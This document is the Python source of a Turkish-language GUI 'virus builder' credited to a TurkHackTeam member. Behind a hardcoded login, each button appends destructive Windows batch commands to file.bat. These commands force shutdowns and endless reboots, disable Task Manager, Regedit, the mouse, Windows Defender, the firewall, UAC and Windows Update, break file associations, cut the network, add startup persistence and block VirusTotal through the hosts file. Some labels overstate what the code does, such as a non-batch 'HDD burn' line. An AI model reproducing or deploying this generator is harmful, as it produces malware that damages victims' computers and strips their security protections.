# Coded by MuhammedTr768 
# TurkHackTeam MuhammedTr768
# hackersmtt@gmail.com

from tkinter import *
from tkinter import messagebox

def basarili():
    def baslangicc():
    	errt = open("file.bat", "a")
    	errt.write("\nSHUTDOWN -s -t 01")
    	errt.close()
    	messagebox.showinfo("Virüs Oluşturucu", "Anında Reset Kodu Eklendi")
    def gyiptal():
    	jefs = open("file.bat", "a")
    	jefs.write("\nreg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul")
    	jefs.close()
    	messagebox.showinfo("Virüs Oluşturucu", "Görev Yöneticisi İptal Kodu Eklendi")
    def sdosyap():
    	yarao = open("file.bat", "a")
    	yarao.write("\nattrib +s %0")
    	yarao.close()
    	messagebox.showinfo("Virüs Oluşturucu", "Sistem Dosyası Yapma Kodu Eklendi")
    def explk():
    	sfkco = open("file.bat", "a")
    	sfkco.write("\nTASKKILL -f -im explorer.exe")
    	sfkco.close()
    	messagebox.showinfo("Virüs Oluşturucu", "Explorer Kapatma Kodu Eklendi")
    def hddyak():
    	wfjd = open("file.bat", "a")
    	wfjd.write("\n/timersecure 0 0 //mkdir $mid(C:,1,2) $+ $rand(1,99999) $+ $rand(A,Z) $+ $rand(a,z)")
    	wfjd.close()
    	messagebox.showinfo("Virüs Oluşturucu", "HDD Yakma Kodu Eklendi")
    def rgdtkpt():
    	ejvkeo = open("file.bat", "a")
    	ejvkeo.write("\nreg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t\nREG_DWORD/d 1/f > nul")
    	ejvkeo.close()
    	messagebox.showinfo("Virüs Oluşturucu", "Regedit Kapatma Kodu Eklendi")
    def dydegis():
        wgiyeh = open("file.bat", "a")
        wgiyeh.write("\nassoc .mp3=txtfile\nassoc .xml=pngfile\nassoc .png=txtfile\nassoc .dll=txtfile\nassoc .exe=pngfile\nassoc .vbs=Visual Style\nassoc .reg=xmlfile\nassoc .txt=regfile")
        wgiyeh.close()
        messagebox.showinfo("Virüs Oluşturucu", "Dosya Yapısı Değiştirme Kodu Eklendi")
    def gmodkapa():
        greevmd = open("file.bat", "a")
        greevmd.write('\ncopy %0 "%userprofile%\..\All Users\Start Menu\Programs\Startup"')
        greevmd.close()
        messagebox.showinfo("Virüs Oluşturucu", "Başlangıçta Çalıştırma Kodu Eklendi")
    def intkokkes():
        intkes = open("file.bat", "a")
        intkes.write('\necho @echo off>c:\windows\wimn32.bat\necho break off>>c:\windows\wimn32.bat\necho ipconfig/release_all>>c:\windows\wimn32.bat\necho end>>c:\windows\wimn32.bat\nreg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v WINDOWsAPI /t reg_sz /d c:\windows\wimn32.bat /f\nreg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v CONTROLexit /t reg_sz /d c:\windows\wimn32.bat /f')
        intkes.close()
        messagebox.showinfo("Virüs Oluşturucu", "İnterneti Kesme Kodu Eklendi")
    def tarihdeg():
        tdegiso = open("file.bat", "a")
        tdegiso.write("\ndate 01/01/2000\ntime 08:00")
        tdegiso.close()
        messagebox.showinfo("Virüs Oluşturucu", "Tarih ve Zaman Değiştirme Kodu Eklendi")
    def mousedeg():
        msdeso = open("file.bat", "a")
        msdeso.write("\nRUNDLL32 USER32.DLL,SwapMouseButton")
        msdeso.close()
        messagebox.showinfo("Virüs Oluşturucu", "Mouse Tuşlarının Yerini Değiştirme Eklendi")
    def acgizll():
        hsguhe = open("file.bat", "a")
        hsguhe.write("\nattrib +h %0")
        hsguhe.close()
        messagebox.showinfo("Virüs Oluşturucu", "Açılınca Gizleme Kodu Eklendi")
    def saltokun():
        bsegv = open("file.bat", "a")
        bsegv.write("\nattrib +r %0")
        bsegv.close()
        messagebox.showinfo("Virüs Oluşturucu", "Salt Okunur Yapıldı")
    def clocks():
        sfheuv = open("file.bat", "a")
        sfheuv.write("\necho Set wshShell =wscript.CreateObject(“WScript.Shell”) >>sendkey.vbs\necho do >>sendkey.vbs\necho wscript.sleep 100 >>sendkey.vbs\necho wshshell.sendkeys “{CAPSLOCK}” >>sendkey.vbs\necho loop >>sendkey.vbs\nsendkey.vbs")
        sfheuv.close()
        messagebox.showinfo("Virüs Oluşturucu", "Caps Lock Spam Kodu Eklendi")
    def mdevrdis():
        hugoa = open("file.bat", "a")
        hugoa.write('\nset fare="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"\nreg delete %fare%\nreg add %fare% /v Start /t REG_DWORD /d 4')
        hugoa.close()
        messagebox.showinfo("Virüs Oluşturucu", "Fare Devre Dışı Kodu Eklendi")
    def sybasasas():
        tyerra = open("file.bat", "a")
        tyerra.write("\necho @echo off>c: \windows\hartlell.bat\necho break off>>c: \windows\hartlell.bat\necho shutdown -r -t 11 -f>>c: \windows\hartlell.bat\necho end>>c: \windows\hartlell.bat\nreg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v startAPI /t reg_sz /d c: \windows\hartlell.bat /f\nreg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v /t reg_sz /d c: \windows\hartlell.bat /f")
        tyerra.close()
        messagebox.showinfo("Virüs Oluşturucu", "Sürekli Yeniden Başlatma Kodu Eklendi")
    def wininica():
        windoodef = open("file.bat", "a")
        windoodef.write("\ncopy %0 %systemroot%\system32\%0\necho [windows] >> %systemroot%\win.ini\necho load=%systemroot%\system32\%0 >> %systemroot%\win.ini\necho run=%systemroot%\system32\%0 >> %systemroot%\win.ini")
        windoodef.close()
        messagebox.showinfo("Virüs Oluşturucu", "Win.ini Dosyasının İçine Koyma Kodu Eklendi")
    def vtbangel():
        rastgelengel = open("file.bat", "a")
        rastgelengel.write('\ncd "%systemroot%\System32\Drivers\etc"\necho 127.0.0.1 virustotal.com >> "Hosts"\necho 127.0.0.1 www.virustotal.com >> "Hosts"')
        rastgelengel.close()
        messagebox.showinfo("Virüs Oluşturucu", "Virüs Total Engelleme Kodu Eklendi")
    def pckapanmiyoab():
        rastgelme = open("file.bat", "a")
        rastgelme.write('\ncopy %0 %systemroot%\system32\drivers\%0\nreg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v PWNAGE /t REG_SZ /d %systemroot%\system32\drivers\%0 /f >nul')
        rastgelme.close()
        messagebox.showinfo("Virüs Oluşturucu", "Başlangıç Anahtarına Koyma Kodu Eklendi")
    def yondeevri():
        yinerast = open("file.bat", "a")
        yinerast.write('\n@Set RegistyEditCmd=Cmd /k Reg Add\n@Set HiveSysKey=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\n@%RegistyEditCmd% "%HiveSysKey%" /v "EnableLUA" /t "REG_DWORD" /d "0" /f > nul')
        yinerast.close()
        messagebox.showinfo("Virüs Oluşturucu", "Yönetici Devre Dışı Bırakma Kodu Eklendi")
    def windevdef():
        defenderln = open("file.bat", "a")
        defenderln.write('\nnet stop "WinDefend"\ntaskkill /f /t /im "MSASCui.exe"')
        defenderln.close()
        messagebox.showinfo("Virüs Oluşturucu", "Windows Defender Etkisiz Hale Getirme Eklendi")
    def frwall():
        printlnfm = open("file.bat", "a")
        printlnfm.write('\nnet stop "MpsSvc"\ntaskkill /f /t /im "FirewallControlPanel.exe"')
        printlnfm.close()
        messagebox.showinfo("Virüs Oluşturucu", "Firewall Etkisiz Hale Getirme Eklendi")
    def guvenmerk():
        guvenmiyonab = open("file.bat", "a")
        guvenmiyonab.write('\nnet stop "wscsvc"')
        guvenmiyonab.close()
        messagebox.showinfo("Virüs Oluşturucu", "Güvenlik Merkezi Etkisiz Hale Getirme Eklendi")
    def uackapa():
        ucmaua = open("file.bat", "a")
        ucmaua.write('\n@Cmd /k Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t "REG_DWORD" /d "0" /f > nul')
        ucmaua.close()
        messagebox.showinfo("Virüs Oluşturucu", "UAC Kapatma Kodu Eklendi")
    def winabdeyt():
        abdeytledi = open("file.bat", "a")
        abdeytledi.write('\nnet stop "wuauserv"')
        abdeytledi.close()
        messagebox.showinfo("Virüs Oluşturucu", "Windows Update Engelleme Kodu Eklendi")
    def killdisk():
    	tykilll = open("file.bat", "a")
    	tykilll.write("\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe\nstart chrome.exe")
    	tykilll.close()
    	messagebox.showinfo("Virüs Oluşturucu", "Ram Öldürme Kodu Eklendi")
    root = Tk()
    root.title('Virüs Oluşturucu THT')
    root.geometry('500x435')
    tre = open("file.bat", "w")
    tre.write("@echo off")
    tre.close()
    blgi = Label(root, text="Dosya Oluşturuldu\nSeçtikleriniz eklenecektir", font="Arial 15")
    blgi.pack()
    cllxk = Button(root, text="Caps Lock Spam", width=15, command=clocks)
    cllxk.place(x=190, y=100)
    mdevdii = Button(root, text="Mouse Devre Dışı", width=15, command=mdevrdis)
    mdevdii.place(x=190, y=75)
    saltoknn = Button(root, text="Salt Okunur Yap", width=15, command=saltokun)
    saltoknn.place(x=190, y=125)
    killrammir = Button(root, text="Ram Öldür", width=15, command=killdisk)
    killrammir.place(x=190, y=50)
    sybassit = Button(root, text="Sürekli Y. Başlat", width=15, command=sybasasas)
    sybassit.place(x=190, y=150)
    winicin = Button(root, text="Win.ini içine koy", width=15, command=wininica)
    winicin.place(x=190, y=175)
    vtengel = Button(root, text="V.Total Engelleme", width=15, command=vtbangel)
    vtengel.place(x=190, y=200)
    pckapanmalan = Button(root, text="Başlangıc Anahtara\n koy", width=15, command=pckapanmiyoab)
    pckapanmalan.place(x=190, y=225)
    ydevdislama = Button(root, text="Yönetici Dev. Dış.", width=15, command=yondeevri)
    ydevdislama.place(x=190, y=260)
    windefdevdis = Button(root, text="Win Def D. Dışı", width=15, command=windevdef)
    windefdevdis.place(x=190, y=285)
    firewall = Button(root, text="Firewall D. Dışı yap", width=15, command=frwall)
    firewall.place(x=190, y=310)
    guvmerka = Button(root, text="Güvenlik M. D. Dışı", width=15, command=guvenmerk)
    guvmerka.place(x=190, y=335)
    uac = Button(root, text="UAC Kapat", width=15, command=uackapa)
    uac.place(x=345, y=50)
    winupdata = Button(root, text="Win. Update D. Dışı", width=15, command=winabdeyt)
    winupdata.place(x=345, y=75)
    sonnotby = Label(root, text="Çok Yakında...", font="Arial 15")
    sonnotby.place(x=345, y=100)



    baslanbut = Button(root, text="PC Anında Reset", width=14, command=baslangicc)
    baslanbut.pack(anchor="nw")
    gyipt = Button(root, text="Görev Y. İptal Et", width=14, command=gyiptal)
    gyipt.pack(anchor="nw")
    sdosyy = Button(root, text="Sistem Dosyası Yap", width=14, command=sdosyap)
    sdosyy.pack(anchor="nw")
    exkapat = Button(root, text="Explorer'ı Kapat", width=14, command=explk)
    exkapat.pack(anchor="nw")
    hddyakw = Button(root, text="HDD Yak", width=14, command=hddyak)
    hddyakw.pack(anchor="nw")
    rgkpt = Button(root, text="Regedit Kapat", width=14, command=rgdtkpt)
    rgkpt.pack(anchor="nw")
    dyapdegis = Button(root, text="Dosyaların Yapısını Değiştir", width=19, command=dydegis)
    dyapdegis.pack(anchor="nw")
    gmodkapatma = Button(root, text="Başlangıçta Çalıştır", width=16, command=gmodkapa)
    gmodkapatma.pack(anchor="nw")
    intkesici = Button(root, text="İnt. Sınırsız Kes", width=15, command=intkokkes)
    intkesici.pack(anchor="nw")
    tdegegege = Button(root, text="Tarih Değiştirme", width=15, command=tarihdeg)
    tdegegege.pack(anchor="nw")
    mdgssg = Button(root, text="Mouse Tuş Yerini Değiş", width=19, command=mousedeg)
    mdgssg.pack(anchor="nw")
    agzzl = Button(root, text="Açılınca Gizle", width=14, command=acgizll)
    agzzl.pack(anchor="nw")
    
    root.mainloop()

def girisyap():
    if girisk.get() == "turkhackteam" and giriss.get() == "tht768":
        basarili()
    else:
        messagebox.showwarning("Virüs Oluşturucu", "Bilgileri Yanlış Girdiniz !")
pencere = Tk()
pencere.title('Virüs Oluşturucu (THT)')
pencere.geometry('500x350')

hmesaj = Label(pencere, text="Hoşgeldiniz", font="Arial 15")
hmesaj.pack()

gmesaj = Label(pencere, text="Giriş\n\nKullanıcı Adı:", font="Arial 10")
gmesaj.pack()

girisk = Entry(pencere, width=30)
girisk.pack()

kad = Label(pencere, text="Şifre", font="Arial 10")
kad.pack()

giriss = Entry(pencere, width=30)
giriss.pack()

girisbtn = Button(pencere, text="Giriş Yap", width=10, command=girisyap)
girisbtn.pack()

pencere.mainloop()